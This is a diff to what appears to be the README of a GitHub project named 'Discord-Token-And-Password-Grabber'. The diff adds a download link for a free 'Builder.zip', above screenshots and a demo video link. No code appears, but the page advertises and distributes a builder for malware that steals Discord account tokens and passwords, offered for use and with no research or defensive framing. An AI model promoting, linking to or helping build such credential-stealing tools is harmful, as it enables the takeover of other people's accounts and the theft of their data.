@@ -1,3 +1,5 @@
+## Tool Free (*not encrypted*) [Builder.zip](https://github.com/X-Ii7x/Discord-Token-And-Password-Grabber/files/7665248/Builder.zip)
+
 ![image](https://user-images.githubusercontent.com/95602963/144788455-62e3307b-2f30-4ae4-a7d6-f525d309edbb.png)
 ![image](https://user-images.githubusercontent.com/95602963/144790135-a2908c2b-4ccb-490d-ac4b-69b3a7d08d10.png) ![image](https://user-images.githubusercontent.com/95602963/144788469-52ae8885-b705-44a0-b3ab-312f3b0342cb.png) ![image](https://user-images.githubusercontent.com/95602963/144790207-ec786a50-051b-4436-bd01-1648a169bd91.png) ![image](https://user-images.githubusercontent.com/95602963/144790229-2c5b422c-9dc7-4f0a-b75c-348ef3ca3682.png) ![image](https://user-images.githubusercontent.com/95602963/144790265-e3bc5c9e-12da-479c-9b44-24faf61c0290.png)
 https://cdn.discordapp.com/attachments/917300986769440818/917307092849791046/bandicam_2021-12-06_00-00-00-565.mp4
